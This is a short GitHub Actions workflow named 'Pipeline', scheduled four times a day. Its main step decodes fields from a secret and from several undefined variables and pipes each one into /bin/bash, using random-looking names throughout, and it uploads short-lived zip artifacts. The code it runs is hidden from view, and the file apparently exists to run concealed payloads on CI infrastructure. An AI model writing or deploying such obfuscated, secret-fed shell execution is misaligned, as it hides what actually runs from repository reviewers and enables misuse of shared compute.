name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '51 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          lktn4: ${{ secrets.lktn4 }}
        run: |
          printf '%s' "$lktn4" | jq -r .xq7999 | /bin/bash
          printf '%s' "$ln02" | jq -r .cvxt7792 | /bin/bash
          echo $gqj724 | jq -r .lpv09 | /bin/bash
          printf '%s' "$tlx6" | jq -r .pqvf158 | /bin/bash
          printf '%s' "$dbq7" | jq -r .m64 | /bin/bash
          echo $eq36228 | jq -r .w6737 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 4sZzKVG5
          path: "*.zip"
          retention-days: 1
